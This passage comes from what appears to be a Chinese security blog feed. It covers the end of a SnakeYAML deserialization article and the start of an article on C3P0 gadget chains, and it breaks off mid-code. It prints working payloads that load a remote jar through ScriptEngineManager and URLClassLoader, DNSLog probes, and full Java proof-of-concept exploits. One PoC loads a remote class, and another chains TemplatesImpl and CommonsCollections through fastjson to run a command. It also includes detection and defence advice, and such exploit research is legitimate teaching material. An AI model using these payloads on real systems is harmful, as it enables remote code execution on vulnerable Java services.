class="string">&quot;http://ip/yaml-payload.jar&quot;</span>]]]]</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%TAG ! tag:yaml.org,<span class="number">2002</span>:</span><br><span class="line">---</span><br><span class="line">!javax.script.ScriptEngineManager [!java.net.URLClassLoader [[!java.net.URL [<span class="string">&quot;http://ip/yaml-payload.jar&quot;</span>]]]]</span><br></pre></td></tr></table></figure><h2 id="探测方式"><a href="#探测方式" class="headerlink" title="探测方式"></a>探测方式</h2><h3 id="SPI"><a href="#SPI" class="headerlink" title="SPI"></a>SPI</h3><p>SnakeYAML在解析带键值对的集合的时候会对键调用hashCode方法，因此会触发DNSLog解析，这里通过构造URL对象并将其构造为一个mapping。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!!java.net.URL [<span class="literal">null</span>, <span class="string">&quot;http://1pvn68.dnslog.cn&quot;</span>]: <span class="number">1</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 利用%TAG来申明一个TAG, 后续再调用!str的话就会自动把TAG前缀拼接补全</span></span><br><span class="line">%TAG ! tag:yaml.org,<span class="number">2002</span>:</span><br><span class="line">---</span><br><span class="line">!javax.script.ScriptEngineManager [!java.net.URLClassLoader [[!java.net.URL [<span class="string">&quot;http://ip/yaml-payload.jar&quot;</span>]]]]</span><br></pre></td></tr></table></figure><h3 id="HashCode"><a href="#HashCode" class="headerlink" title="HashCode"></a>HashCode</h3><p>具体利用原理详见Y4tacker师傅的分析：<a href="https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%AE%9E%E7%8E%B0Gadget%E6%8E%A2%E6%B5%8B/">SnakeYAML实现Gadget探测</a>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;!!java.net.URL [\&quot;http://ra5zf8uv32z5jnfyy18c1yiwfnle93.oastify.com/\&quot;]: 1&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;key: [!!java.lang.String &#123;&#125;: 0, !!java.net.URL [null, \&quot;[http://5ydl3f.dnslog.cn](http://5ydl3f.dnslog.cn/)\&quot;]: 1]&quot;</span>;</span><br><span class="line"></span><br><span class="line">key: [!!java.lang.String &#123;&#125;: <span class="number">0</span>, !!java.net.URL [<span class="literal">null</span>, <span class="string">&quot;http://jeeoy1.dnslog.cn&quot;</span>]: <span class="number">1</span>]</span><br></pre></td></tr></table></figure><p><img src="/2023/09/25/SnakeYaml/1709813161116-4c9f4daf-f7ec-456e-89c4-3276e1d694fc.png"></p><h2 id="检测与防御"><a href="#检测与防御" class="headerlink" title="检测与防御"></a>检测与防御</h2><h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><p>排查服务端环境是否使用了SnakeYaml，若使用，则全局搜索关键字yaml.load(，若存在关键字则需要进一步排查参数是否外部可控。</p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ul><li><p>禁止Yaml.load函数参数外部可控</p></li><li><p>当反序列化在业务中不可获取时，则需严格过滤该参数内容，使用SafeConstructor类对反序列化的内容进行限制或使用白名单控制反序列化的类的白名单</p></li></ul><p><img src="/2023/09/25/SnakeYaml/1709813161236-89e351e6-557d-486b-b475-40bdb25bcde1.png"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.mi1k7ea.com/2019/11/29/Java-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">Java SnakeYaml反序列化漏洞</a></p><p><a href="https://xz.aliyun.com/t/10655">SnakeYaml 之不出网RCE</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C3P0</title>
      <link href="/2023/06/25/C3P0/"/>
      <url>/2023/06/25/C3P0/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><font style="color:rgb(51, 51, 51);">C3P0</font><font style="color:rgb(51, 51, 51);">是一个开源的</font><font style="color:rgb(51, 51, 51);">JDBC</font><font style="color:rgb(51, 51, 51);">连接池，它实现了数据源和</font><font style="color:rgb(51, 51, 51);">JNDI</font><font style="color:rgb(51, 51, 51);">绑定，支持</font><font style="color:rgb(51, 51, 51);">JDBC3</font><font style="color:rgb(51, 51, 51);">规范和</font><font style="color:rgb(51, 51, 51);">JDBC2</font><font style="color:rgb(51, 51, 51);">的标准扩展。目前使用它的开源项目有</font><font style="color:rgb(51, 51, 51);">Hibernate</font><font style="color:rgb(51, 51, 51);">、</font><font style="color:rgb(51, 51, 51);">Spring</font><font style="color:rgb(51, 51, 51);">等。</font></p><p><font style="color:rgb(51, 51, 51);">本文主要对</font><font style="color:rgb(51, 51, 51);">C3P0</font><font style="color:rgb(51, 51, 51);">组件的三条常见反序列化调用链（</font><font style="color:rgb(51, 51, 51);">HEX</font><font style="color:rgb(51, 51, 51);">序列化字节加载器反序列化、</font><font style="color:rgb(51, 51, 51);">URLClassLoader</font><font style="color:rgb(51, 51, 51);">远程类加载、</font><font style="color:rgb(51, 51, 51);">JNDI</font><font style="color:rgb(51, 51, 51);">注入）及不出网情况下利用</font><font style="color:rgb(51, 51, 51);">Tomcat</font><font style="color:rgb(51, 51, 51);">原生类工厂进行</font><font style="color:rgb(51, 51, 51);">EL</font><font style="color:rgb(51, 51, 51);">表达式注入进行分析。</font></p><p>依赖版本为c3p0 v0.9.5.2。</p><h2 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h2><p><img src="/2023/06/25/C3P0/1710172005124-ba3e3d2c-44aa-4497-b6e6-7c3885f7501f.png"></p><h3 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h3><p>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject方法中会先判断对象o是否是IndirectlySerialized类的对象或者是其子类的对象，接着调用ReferenceSerialized#getObject方法，再强转换对象为ConnectionPoolDataSource。</p><p><img src="/2023/06/25/C3P0/1709727789491-339caea0-bcd9-42b3-a638-001d3ad739f6.png"></p><p>但是ConnectionPoolDataSource类并不能反序列化，在com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#writeObject方法中，由于不能序列化操作，会进入catch中，会调用com.mchange.v2.naming.ReferenceIndirector#indirectForm方法在序列化的内容上套一层。</p><p><img src="/2023/06/25/C3P0/1709727858740-c553a5b4-59c9-443f-a6fc-45efa59f38e5.png"></p><p><img src="/2023/06/25/C3P0/1709728158172-63c25642-d309-48a2-ab10-73f0848e4b5e.png"></p><p>com.mchange.v2.naming.ReferenceIndirector#indirectForm方法会返回一个ReferenceSerialized对象。</p><p><img src="/2023/06/25/C3P0/1709728677705-23d8fea6-71db-4978-9f0a-b4aa37bccbc0.png"></p><p>在反序列化时，实际上是调用com.mchange.v2.ser.IndirectlySerialized子类com.mchange.v2.naming.ReferenceIndirector中的getObject方法，进一步调用com.mchange.v2.naming.ReferenceableUtils#referenceToObject方法，通过URLClassLoader实例化远程类，造成任意代码执行。</p><p><img src="/2023/06/25/C3P0/1709728800284-514a1df2-f1ae-4338-bd5b-25464869e832.png"></p><p><img src="/2023/06/25/C3P0/1709728982727-9c9a3276-7d49-4b8f-bfb5-0c4cbbdb7fdd.png"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>PoolBackedDataSource在序列化时可以序列化入一个任意Reference类，在PoolBackedDataSource反序列化时该Reference类中指定的对象会被URLClassLoader远程加载实例化。</p><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.c3p0;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;</span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EvilReference</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>, Referenceable &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calculator&quot;</span>, <span class="string">&quot;Calculator&quot;</span>, <span class="string">&quot;http://127.0.0.1:8080/&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String user, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">PoolBackedDataSourceBase</span> <span class="variable">poolBackedDataSourceBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);</span><br><span class="line">        setFieldValue(poolBackedDataSourceBase, <span class="string">&quot;connectionPoolDataSource&quot;</span>, <span class="keyword">new</span> <span class="title class_">EvilReference</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">            outputStream.writeObject(poolBackedDataSourceBase);</span><br><span class="line">            outputStream.flush();</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="HEX序列化字节加载器"><a href="#HEX序列化字节加载器" class="headerlink" title="HEX序列化字节加载器"></a>HEX序列化字节加载器</h3><p>com.mchange.v2.c3p0.WrapperConnectionPoolDataSource的构造方法中会调用com.mchange.v2.c3p0.impl.C3P0ImplUtils#parseUserOverridesAsString方法，parseUserOverridesAsString方法先对传入的userOverrideAsString进行截取，将HASM_HEADER头和最后一位的;去除，将其视为十六进制数据转化成byte，再调用com.mchange.v2.ser.SerializableUtils#fromByteArray方法对其进行处理。</p><p><img src="/2023/06/25/C3P0/1709793527208-8f3ae0c3-61b7-4e96-b67a-af9aa6977fc0.png"></p><p><img src="/2023/06/25/C3P0/1709795884080-151e6270-da7e-447c-b0a4-398008e02d66.png"></p><p>fromByteArray方法会调用deserializeFromByteArray方法对byte进行反序列化。</p><p><img src="/2023/06/25/C3P0/1709796106970-6a49b1c1-1b1c-4b08-b57b-cb9b56944057.png"></p><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>在fastjson，jackson等环镜下，此Gadget更适合在不出网环境下利用，userOverridesAsString属性可控，导致可以从其setter方法setuserOverridesAsString开始到最后deserializeFromByteArray对其调用readObject进行反序列化，造成反序列化漏洞。</p><h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.c3p0;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HexBase</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">ctConstructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, clazz);</span><br><span class="line">        ctConstructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;</span>);</span><br><span class="line">        clazz.addConstructor(ctConstructor);</span><br><span class="line">        <span class="type">byte</span>[][] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytes);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;h3&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> LazyMap.decorate(map1, invokerTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map2, templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hashSet.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field field1;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field1 = HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            field1 = HashSet.class.getDeclaredField(<span class="string">&quot;backingMap&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> (HashMap) field1.get(hashSet);</span><br><span class="line"></span><br><span class="line">        Field field2;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field2 = HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            field2 = HashMap.class.getDeclaredField(<span class="string">&quot;elementData&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] array = (Object[])field2.get(hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (node == <span class="literal">null</span>) &#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Field field3;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field3 = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            field3 = Class.forName(<span class="string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        field3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field3.set(node, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field4</span> <span class="operator">=</span> invokerTransformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">        field4.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field4.set(invokerTransformer, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">string</span> <span class="operator">=</span> toHexAscii(tobyteArray(hashSet));</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;a\&quot;:&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;b\&quot;:&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span> + string + <span class="string">&quot;;\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(jsonString);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span> <span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toHexAscii</span><span class="params">(<span class="type">byte</span>[] bytes)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> 